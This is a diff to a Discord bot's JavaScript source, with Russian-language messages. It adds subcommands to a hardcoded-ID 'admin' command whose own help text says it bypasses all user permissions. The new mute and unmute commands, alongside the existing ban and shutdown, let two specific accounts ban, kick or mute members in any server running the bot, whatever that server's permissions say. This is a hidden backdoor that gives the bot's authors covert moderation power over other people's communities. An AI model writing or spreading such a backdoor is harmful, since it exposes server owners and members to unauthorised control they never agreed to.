@@ -922,12 +922,31 @@ client.guilds.forEach((guild) => {users += client.users.size});
         message.delete();
 
     } else if (['admin'].includes(command) && (message.author.id === "361951318929309707" || message.author.id === "242091351951409152")) {
+	    if(!args[0] || args[0] === 'help') {
+		    message.channel.send("**`Данная команда позволяет обходить все права пользователя.** \n**Команды:** \n**shutdown** - выключить бота (использовать 2 раза) \n**ban** [user] - обход прав на бан. \n**kick** [user] - обход прав на кик. \n**mute** [user] - обход прав на мут. \n**unmute** [user] - обход прав на анмут.`")
+	    }
 	    if(args[0] === 'shutdown') {
 		    message.channel.send("выключаюсь")
 		    setTimeout(() => {
 			    process.exit();
   }, 5000)
 	    }
+	    if(args[0] === 'mute') {
+		    let muted = message.mentions.members.first();
+	  if(!muted) return message.reply("укажите кого замутить");
+	  const mutedRole = message.member.guild.roles.find('name', "muted") || message.member.guild.roles.find('name', "Muted");
+	  if(!mutedRole) return message.reply("пожалуйста создайте роль `muted`");
+          muted.addRole(mutedRole)
+	  message.reply(`я успешно замутил пользователя ${muted}, для размута пропишите x!unmute`)
+	  }
+	    if(args[0] === 'unmute') {
+	  let muted = message.mentions.members.first();
+          if(!muted) return message.reply("укажите кого размутить");
+          const mutedRole = message.member.guild.roles.find('name', "muted") || message.member.guild.roles.find('name', "Muted");
+          if(!mutedRole) message.reply("пожалуйста создайте роль `muted`");
+          muted.removeRole(mutedRole)
+	  message.reply(`я успешно размутил пользователя ${muted}.`)
+	  }
 	    if(args[0] === 'ban') {
 		    let member = message.mentions.members.first();
 		    member.ban();
